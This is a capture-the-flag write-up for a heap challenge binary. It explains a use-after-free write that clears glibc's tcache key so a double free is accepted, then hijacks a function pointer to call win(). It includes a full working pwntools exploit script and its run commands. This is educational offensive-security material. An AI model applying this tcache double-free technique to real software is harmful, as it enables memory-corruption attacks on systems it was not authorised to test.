### Recycler - Heap Exploitation Writeup

> x Exam (57)


#### Challenge Overview and Binary Reconnaissance

The Recycler challenge presents a heap menu binary that manages an array of up to eight `Item` structs, each consisting of a function pointer `action` occupying eight bytes at offset zero, followed by a 24-byte data buffer, for a total user-data size of 32 bytes and a tcache size class of `0x20`. The four exposed primitives are **create**, **free**, **edit**, and **invoke**. The vulnerability is a **double free** enabled by a **Use-After-Free write** that defeats the glibc 2.29+ tcache key sentinel, causing the same chunk to be returned twice by consecutive `malloc` calls and ultimately redirecting the `action` function pointer to `win()`.

The first step is a `checksec` inspection of the binary:

```bash
checksec --file ./recycler
```

```
NX:      enabled
PIE:     disabled    ← win() address is fixed across all runs
Canary:  enabled
RELRO:   partial
```

PIE being disabled is the decisive observation: the address of `win` is a compile-time constant readable directly from the ELF symbol table with `elf.sym.win`, eliminating any requirement for a runtime information leak.

#### Vulnerability Identification

Reading `main.c` reveals two interacting flaws. The **free** handler (case 2) calls `free(items[i])` without subsequently writing `NULL` into `items[i]`, leaving the slot holding a dangling pointer to a chunk that now resides inside the tcache. The **edit** handler (case 3) calls `read(STDIN_FILENO, items[i], sizeof(struct Item))`, writing 32 attacker-controlled bytes through the slot pointer without any liveness check, which means it operates identically whether the slot points to a live chunk or a freed one. The combination of these two behaviors constitutes a **Use-After-Free write primitive**: the attacker can write arbitrary bytes into a chunk while it sits inside the tcache bin, directly overwriting the allocator's internal metadata.

#### The Tcache Key Check and Its Bypass

When a chunk is freed into the tcache (glibc 2.29+), the allocator writes a per-thread random sentinel, the **tcache key**, into the second quadword of the freed chunk's user area. The struct layout maps directly onto the chunk's bin metadata as follows:

```
Freed chunk user area (= struct Item memory):
  [offset 0x00]  fd  (safe-linked forward pointer)  =  action field
  [offset 0x08]  key (tcache sentinel)              =  data[0..7]
  [offset 0x10]  ... (rest of payload)              =  data[8..23]
```

On any subsequent `free` of the same pointer, glibc reads the value at offset `0x08` and, if the sentinel is present, walks the tcache list to confirm the chunk is already there, aborting with `free(): double free detected in tcache 2`. The bypass is to use the UAF write to zero the key at offset `0x08` before the second `free` is issued. With the sentinel absent, glibc finds no evidence of a prior free and accepts the second `free` unconditionally, inserting the chunk into the bin a second time.

A critical subtlety regarding **safe-linking** (glibc 2.32+) must be noted: the `fd` field at offset `0x00` is overwritten with zeros during the UAF edit, but this has no consequence for the exploit. During the second `free`, glibc calls `tcache_put` which unconditionally encodes and writes a fresh `fd` value regardless of what the UAF edit placed there. The only field whose pre-second-free value matters is the key at offset `0x08`. Safe-linking therefore does not complicate this exploit at all, because no manual `fd` encoding is ever required.

#### Heap Timeline and Exploit Chain

The following sequence of primitive calls describes the complete exploit, with the tcache state annotated at each step:

```
Step 1  create(0)
        malloc(0x20) → chunk A
        items[0] = A,  A->action = default_action

Step 2  free_item(0)
        free(A)  →  tcache[0x20]: [ A → NULL ]
        A[0x00] = safe-linked NULL  (= A >> 12)
        A[0x08] = tcache_key

Step 3  edit(0, p64(0) + p64(0) + b'X'*16)
        UAF write into A while it sits in tcache:
        A[0x00] = 0x0   (irrelevant; glibc rewrites during step 4)
        A[0x08] = 0x0   (key cleared → double-free check disabled)

Step 4  free_item(0)
        double free accepted; glibc rewrites A[0x00] with safe-linked A
        tcache[0x20]: [ A → A ]

Step 5  create(1)
        tcache pop #1 → returns A
        items[1] = A,  A->action = default_action  (overwrites step 3 payload)
        tcache[0x20]: [ A ]

Step 6  create(2)
        tcache pop #2 → returns A
        items[2] = A,  A->action = default_action
        tcache[0x20]: (empty)

        items[0], items[1], items[2] all alias chunk A

Step 7  edit(0, p64(WIN) + b'A'*24)
        UAF write through dangling items[0] (never nulled):
        A->action = win
        Performed AFTER both creates to avoid default_action clobber

Step 8  invoke(1)
        items[1]->action(items[1])  =  win(A)  →  flag
```

The ordering of step 7 is non-obvious and deserves emphasis: because steps 5 and 6 both write `default_action` into `A->action` as part of the `create` handler's initialization, any payload written to `A->action` before those steps would be silently overwritten. Performing the final UAF write through the original dangling slot 0 after both creates are complete is therefore not a preference but a requirement.

#### Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./recycler', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = conn()

# case 1: reads 24 B into items[i]->data   prompt: "data: "
def create(idx, data=b'A' * 24):
    p.sendlineafter(b'> ',      b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data[:24].ljust(24, b'\x00'))

# case 2: free(items[idx]) — no null — dangling pointer remains
def free_item(idx):
    p.sendlineafter(b'> ',      b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

# case 3: reads 32 B into items[idx] from action onward   prompt: "payload: "
def edit(idx, data):
    p.sendlineafter(b'> ',      b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'payload: ',   data[:32].ljust(32, b'\x00'))

# case 4: calls items[idx]->action(items[idx])
def invoke(idx):
    p.sendlineafter(b'> ',      b'4')
    p.sendlineafter(b'index: ', str(idx).encode())

WIN = elf.sym.win

create(0)                                    # slot[0] -> chunk A
free_item(0)                                 # A -> tcache[0x20], key at A[0x08]
edit(0, p64(0) + p64(0) + b'X' * 16)        # UAF: zero key — bypass tcache check
free_item(0)                                 # double free accepted; A twice in tcache
create(1)                                    # slot[1] -> A  (tcache pop #1)
create(2)                                    # slot[2] -> A  (tcache pop #2)
edit(0, p64(WIN) + b'A' * 24)               # dangling slot[0]: A->action = win
invoke(1)                                    # items[1]->action(items[1]) -> win()

print(p.recvall(timeout=2).decode(errors='replace'))
```

#### Execution

```bash
# Local verification
FLAG=flag{test} python3 solve.py

# Remote target
python3 solve.py REMOTE
```

> **Key takeaway:** The Recycler exploit demonstrates that the tcache key check, while sufficient to catch naive double-free attempts, is entirely defeated by any UAF write primitive that can reach offset `0x08` of the freed chunk before the second `free` is issued. The structural enabler is the free-without-null pattern: had `items[i]` been zeroed after `free`, neither the UAF edit nor the double free would be reachable through any menu path. Safe-linking, the other major glibc 2.32+ mitigation, is irrelevant to this technique because the exploit never crafts a custom `fd` value, relying instead on glibc to write a correct safe-linked pointer during the second `free` and on the tcache's LIFO recycling to return the same chunk twice without any pointer manipulation by the attacker.